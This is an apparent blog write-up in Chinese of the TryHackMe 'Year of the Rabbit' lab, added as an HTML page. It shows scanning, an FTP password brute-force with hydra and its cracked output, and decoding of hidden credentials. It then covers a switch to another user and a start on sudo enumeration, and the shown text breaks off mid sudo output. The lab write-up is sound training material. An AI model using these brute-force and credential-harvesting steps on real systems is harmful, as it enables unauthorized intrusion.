@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Year of the Rabbit | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Year of the Rabbit Time to enter the warren…  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.175.146 22 SSH 10.48.175.146:22  OpenSSH 6.7p1 Debian 5 0   2 10.48.175.146 21 FTP 10.48.175.146:21">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Year of the Rabbit">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Year_of_the_Rabbit.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="Year of the Rabbit Time to enter the warren…  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.175.146 22 SSH 10.48.175.146:22  OpenSSH 6.7p1 Debian 5 0   2 10.48.175.146 21 FTP 10.48.175.146:21">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-17T09:15:52.000Z">
+<meta property="article:modified_time" content="2026-05-17T10:41:55.143Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="CVE-2019-14287">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Year_of_the_Rabbit.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Year of the Rabbit',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-17 18:41:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Year of the Rabbit</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-17T09:15:52.000Z" title="发表于 2026-05-17 17:15:52">2026-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T10:41:55.143Z" title="更新于 2026-05-17 18:41:55">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Year-of-the-Rabbit"><a href="#Year-of-the-Rabbit" class="headerlink" title="Year of the Rabbit"></a>Year of the Rabbit</h1><blockquote>
+<p>Time to enter the warren…</p>
+</blockquote>
+<p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">10.48.175.146</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.48.175.146:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 6.7p1 Debian 5</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">10.48.175.146</td>
+<td align="center">21</td>
+<td align="left">FTP</td>
+<td align="left">10.48.175.146:21</td>
+<td align="left"></td>
+<td align="left">Vsftpd 3.0.2</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">10.48.175.146</td>
+<td align="center">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.48.175.146/">http://10.48.175.146:80</a></td>
+<td align="left">Apache2 Debian Default Page: It works</td>
+<td align="left">Apache&#x2F;2.4.10 (Debian), Apache-Web-Server, Apache2 默认页, Apache-HTTP-Server&#x2F;2.4.10, Apache-HTTP-Server-Debian, Apache2Debian默认页</td>
+<td align="center">200</td>
+</tr>
+</tbody></table>
+<p>目录扫描得到 <code>/assets</code>，访问是一个文件目录，点击 <code>/style.css</code>，里面藏有一个新地址</p>
+<blockquote>
+<p>&#x2F;sup3r_s3cr3t_fl4g.php</p>
+</blockquote>
+<p><img src="/../image/TryHackMe/easy/Year_of_the_Rabbit/css.png"></p>
+<p>访问该地址会出现提示关闭 <code>js</code>，既然如此那就直接 <code>burpsuite</code> 抓包，在这过程中又看到了一个隐藏文件夹</p>
+<blockquote>
+<p>&#x2F;WExYY2Cv-qU</p>
+</blockquote>
+<p><img src="/../image/TryHackMe/easy/Year_of_the_Rabbit/hidden.png"></p>
+<p>访问是一张图片，下载后使用 <code>strings</code> 命令查看，得到了 <code>ftp</code> 的用户名 <code>ftpuser</code> 以及一个密码字典</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# strings Hot_Babe.png                                       
+...
+Eh, you&#39;ve earned this. Username for FTP is ftpuser
+One of these is the password:
+Mou+56n%QK8sr
+0rJ7p%6Axm05K
+94rU30Zx45z5c
+...
+Vi^Qf+u%0*q_S
+1Fvdp&amp;bNl3#&amp;l
+zLH%Ot0Bw&amp;c%9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用 <code>hydra</code> 破解得到密码 <code>5iez1wGXKfPKQ</code></p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# hydra -l ftpuser -P passwd.txt ftp:&#x2F;&#x2F;10.48.175.146
+Hydra v9.6 (c) 2023 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2026-05-17 17:34:43
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1&#x2F;p:82), ~6 tries per task
+[DATA] attacking ftp:&#x2F;&#x2F;10.48.175.146:21&#x2F;
+[21][ftp] host: 10.48.175.146   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2026-05-17 17:34:58
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>ftp</code> 登录，有一个文本，将其下载下来</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# ftp 10.48.175.146             
+Connected to 10.48.175.146.
+220 (vsFTPd 3.0.2)
+Name (10.48.175.146:root): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -al
+229 Entering Extended Passive Mode (|||40760|).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             758 Jan 23  2020 Eli&#39;s_Creds.txt
+226 Directory send OK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看是 <code>Brainfuck </code>编码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
+└─<span class="token comment"># cat Eli\'s_Creds.txt              </span>
++++++ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>+++ +++++ +<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+ +++.<span class="token operator">&lt;</span> +++++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>++++ +.<span class="token operator">&lt;</span>++ +<span class="token punctuation">[</span>-<span class="token operator">></span>-
+--<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> ----- .<span class="token operator">&lt;</span>+++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+ +++.<span class="token operator">&lt;</span> +++++ ++<span class="token punctuation">[</span>-<span class="token operator">></span> ----- --<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> ----- --.<span class="token operator">&lt;</span>+
+++++<span class="token punctuation">[</span> -<span class="token operator">></span>--- --<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> -.<span class="token operator">&lt;</span>++ +++++ +<span class="token punctuation">[</span>-<span class="token operator">></span>+ +++++ ++<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> +++++ .++++ +++.- --.<span class="token operator">&lt;</span>+
++++++ +++<span class="token punctuation">[</span>- <span class="token operator">></span>---- ----- <span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>-- ----- ----. ---.<span class="token operator">&lt;</span> +++++ +++<span class="token punctuation">[</span>- <span class="token operator">></span>++++ ++++<span class="token operator">&lt;</span>
+<span class="token punctuation">]</span><span class="token operator">></span>+++ +++.<span class="token operator">&lt;</span> ++++<span class="token punctuation">[</span> -<span class="token operator">></span>+++ +<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+ .<span class="token operator">&lt;</span>+++ +<span class="token punctuation">[</span>-<span class="token operator">></span>+ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>++<span class="token punctuation">..</span> ++++. ----- ---.+
+++.<span class="token operator">&lt;</span>+ ++<span class="token punctuation">[</span>-<span class="token operator">></span> ---<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>---- -.<span class="token operator">&lt;</span>++ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>--- ---<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>---- --.<span class="token operator">&lt;</span>+ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>---
+--<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> -.<span class="token operator">&lt;</span>++ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>+++ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>.<span class="token operator">&lt;</span>++ +<span class="token punctuation">[</span>-<span class="token operator">></span>+ ++<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> +++++ +.<span class="token operator">&lt;</span>++ +++<span class="token punctuation">[</span>- <span class="token operator">></span>++++
++<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+ +++.<span class="token operator">&lt;</span> +++++ +<span class="token punctuation">[</span>-<span class="token operator">></span>- ----- <span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>-- ----- -.<span class="token operator">&lt;</span>++ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>+++ +++<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>+.<span class="token operator">&lt;</span>+
+++++<span class="token punctuation">[</span> -<span class="token operator">></span>--- --<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span> ---.<span class="token operator">&lt;</span> +++++ <span class="token punctuation">[</span>-<span class="token operator">></span>-- ---<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>---. <span class="token operator">&lt;</span>++++ ++++<span class="token punctuation">[</span> -<span class="token operator">></span>+++ +++++
+<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>++ ++++. <span class="token operator">&lt;</span>++++ +++<span class="token punctuation">[</span>- <span class="token operator">></span>---- ---<span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token operator">></span>---- -.+++ +.<span class="token operator">&lt;</span>++ +++++ <span class="token punctuation">[</span>-<span class="token operator">></span>++ +++++
+<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>+. <span class="token operator">&lt;</span>+++<span class="token punctuation">[</span> -<span class="token operator">></span>--- <span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>-- ---.- ----. <span class="token operator">&lt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写个脚本来解码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
++++++ ++++[ ->+++ +++++ +&lt;]>+ +++.&lt; +++++ [->++ +++&lt;] >++++ +.&lt;++ +[->-
+--&lt;]> ----- .&lt;+++ [->++ +&lt;]>+ +++.&lt; +++++ ++[-> ----- --&lt;]> ----- --.&lt;+
+++++[ ->--- --&lt;]> -.&lt;++ +++++ +[->+ +++++ ++&lt;]> +++++ .++++ +++.- --.&lt;+
++++++ +++[- >---- ----- &lt;]>-- ----- ----. ---.&lt; +++++ +++[- >++++ ++++&lt;
+]>+++ +++.&lt; ++++[ ->+++ +&lt;]>+ .&lt;+++ +[->+ +++&lt;] >++.. ++++. ----- ---.+
+++.&lt;+ ++[-> ---&lt;] >---- -.&lt;++ ++++[ ->--- ---&lt;] >---- --.&lt;+ ++++[ ->---
+--&lt;]> -.&lt;++ ++++[ ->+++ +++&lt;] >.&lt;++ +[->+ ++&lt;]> +++++ +.&lt;++ +++[- >++++
++&lt;]>+ +++.&lt; +++++ +[->- ----- &lt;]>-- ----- -.&lt;++ ++++[ ->+++ +++&lt;] >+.&lt;+
+++++[ ->--- --&lt;]> ---.&lt; +++++ [->-- ---&lt;] >---. &lt;++++ ++++[ ->+++ +++++
+&lt;]>++ ++++. &lt;++++ +++[- >---- ---&lt;] >---- -.+++ +.&lt;++ +++++ [->++ +++++
+&lt;]>+. &lt;+++[ ->--- &lt;]>-- ---.- ----. &lt;
+"""</span>
+
+
+<span class="token comment"># Brainfuck 解释器</span>
+tape <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">30000</span>
+ptr <span class="token operator">=</span> <span class="token number">0</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+output <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    c <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+    <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">:</span>
+        ptr <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'&lt;'</span><span class="token punctuation">:</span>
+        ptr <span class="token operator">-=</span> <span class="token number">1</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
+        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
+        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">:</span>
+        output <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            depth <span class="token operator">=</span> <span class="token number">1</span>
+            <span class="token keyword">while</span> depth <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+                i <span class="token operator">+=</span> <span class="token number">1</span>
+                <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">:</span>
+                    depth <span class="token operator">+=</span> <span class="token number">1</span>
+                <span class="token keyword">elif</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">']'</span><span class="token punctuation">:</span>
+                    depth <span class="token operator">-=</span> <span class="token number">1</span>
+    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">']'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            depth <span class="token operator">=</span> <span class="token number">1</span>
+            <span class="token keyword">while</span> depth <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+                i <span class="token operator">-=</span> <span class="token number">1</span>
+                <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">:</span>
+                    depth <span class="token operator">-=</span> <span class="token number">1</span>
+                <span class="token keyword">elif</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">']'</span><span class="token punctuation">:</span>
+                    depth <span class="token operator">+=</span> <span class="token number">1</span>
+    i <span class="token operator">+=</span> <span class="token number">1</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行后得到登录凭证，使用此凭证成功登录 <code>ssh</code></p>
+<blockquote>
+<p>User: eli<br>Password: DSpDiM1wAEwid</p>
+</blockquote>
+<p>同时在登录的时候还有一个提示，意思是在 <code>s3cr3t</code> 留了一个隐藏信息</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# ssh eli@10.48.175.146
+eli@10.48.175.146&#39;s password: 
+
+1 new message
+Message from Root to Gwendoline:
+
+&quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I&#39;ve left you a hidden message there&quot;
+
+END MESSAGE
+
+eli@year-of-the-rabbit:~$ id
+uid&#x3D;1000(eli) gid&#x3D;1000(eli) groups&#x3D;1000(eli),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>寻找该地址，并查看该目录下的文件，得到了 <code>gwendoline</code> 的登录密码 <code>MniVCQVhQHUNI</code></p>
+<pre class="line-numbers language-none"><code class="language-none">eli@year-of-the-rabbit:~$ find &#x2F; -name s3cr3t 2&gt;&#x2F;dev&#x2F;null
+&#x2F;usr&#x2F;games&#x2F;s3cr3t
+eli@year-of-the-rabbit:~$ cd &#x2F;usr&#x2F;games&#x2F;s3cr3t
+eli@year-of-the-rabbit:&#x2F;usr&#x2F;games&#x2F;s3cr3t$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Jan 23  2020 .
+drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
+-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+eli@year-of-the-rabbit:&#x2F;usr&#x2F;games&#x2F;s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
+Your password is awful, Gwendoline. 
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功登录</p>
+<pre class="line-numbers language-none"><code class="language-none">eli@year-of-the-rabbit:&#x2F;usr&#x2F;games&#x2F;s3cr3t$ su gwendoline
+Password: 
+gwendoline@year-of-the-rabbit:&#x2F;usr&#x2F;games&#x2F;s3cr3t$ id
+uid&#x3D;1001(gwendoline) gid&#x3D;1001(gwendoline) groups&#x3D;1001(gwendoline)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个 <code>sudo</code> 规则非常特别：可以以除了 <code>root</code> 以外的身份的身份无密码执行 <code>/usr/bin/vi /home/gwendoline/user.txt</code></p>
+<pre class="line-numbers language-none"><code class="language-none">gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
